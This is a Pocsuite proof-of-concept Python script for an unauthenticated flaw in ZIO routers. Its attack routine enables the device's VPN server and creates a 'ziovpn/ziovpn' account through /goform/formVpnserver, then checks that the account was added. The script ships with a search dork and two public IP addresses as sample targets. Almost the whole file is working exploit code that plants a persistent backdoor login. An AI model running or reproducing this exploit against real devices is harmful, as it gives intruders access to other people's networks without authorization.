#!/usr/bin/env python
# coding: utf-8
from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
from pocsuite.lib.utils.funs import url2ip
import time


class TestPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    author = ['sebao']
    vulDate = ''
    createDate = '2017-07-10'
    updateDate = '2017-07-10'
    references = ['']
    name = 'ZIO ROUTER unauthorized access'
    appPowerLink = ''
    appName = 'ZIO ROUTER'
    appVersion = ''
    vulType = 'command exec'
    desc = '''
            ZIO ROUTER未授权访问
    '''
    dork = 'ZIO ROUTER'
    samples = ['http://1.252.116.202',
               'http://116.127.14.187']

    # 请尽量不要使用第三方库，必要时参考 https://github.com/knownsec/Pocsuite/blob/master/docs/CODING.md#poc-第三方模块依赖说明 填写该字段

    def _attack(self):
        result = {}
        if self.url.endswith('/'):
            self.url = self.url[:-1]

        vul_url = self.url + '/manage_menu.html'
        ip = url2ip(self.url)
        r = req.get(vul_url)

        if r.status_code == 200 and 'opmode.htm' in r.content and 'tcpipwan_adv.htm' in r.content:
            vpn_url = self.url + "/goform/formVpnserver"
            data1 = "ckb_vsEnable=1&rdo_vsSecurityOn=0&hdn_vsIPAddress=&txt_vsUserName=ziovpn&txt_vsPassWord=ziovpn&txt_vsIPAddress_3=202&btn_vsAddAccount=»ç¿ëÀÚ+µî·Ï/¼öÁ¤&hdn_vsDeleteName=&hdn_vsOperType=&submitValue=addUser&submit-url=/vpnserver.htm&ipValue=203&delIndex="
            openvpn = req.post(vpn_url, data=data1)
            time.sleep(5)
            checkurl = self.url + "/vpnserver.htm"
            r1 = req.get(checkurl)
            if r1.status_code == 200 and 'ziovpn' in r1.content:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['url'] = ip
                result['VerifyInfo']['username'] = 'ziovpn'
                result['VerifyInfo']['password'] = 'ziovpn'

            return self.parse_output(result)


    def _verify(self):
        result = {}
        if self.url.endswith('/'):
            self.url = self.url[:-1]

        vul_url = self.url + '/manage_menu.html'

        r = req.get(vul_url)

        if r.status_code == 200 and 'opmode.htm' in r.content and 'tcpipwan_adv.htm' in r.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['url'] = self.url
        return self.parse_output(result)

    def parse_output(self, result):
        # parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)

